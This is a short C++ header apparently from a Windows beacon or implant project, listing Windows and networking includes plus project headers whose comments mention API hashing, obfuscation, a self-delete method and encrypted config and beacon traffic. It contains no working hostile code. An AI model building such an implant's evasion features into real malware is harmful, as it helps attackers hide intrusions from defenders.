#pragma once
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <windows.h>
#include <winternl.h>
#include <wininet.h>
#include <time.h>
#include <stdio.h>
#include <iostream>
#include <shlwapi.h>
#include <lm.h>
#include <fstream>
#include <iostream>
#include <sstream>
#include <ntstatus.h>
#include <ws2tcpip.h>

#pragma comment(lib,"ntdll.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "Ws2_32.lib")

#include "Obfuscation.h"
#include "cJSON.h"
#include "Base64.h"
#include "Structures.h"
#include "Conversions.h"

// for API hashing
#include "Definitions.h"

// self delete (jonas method)
#include "Uninstall.h"

// decrypting config data and encrypt beacon requests
#include "Encryption.h"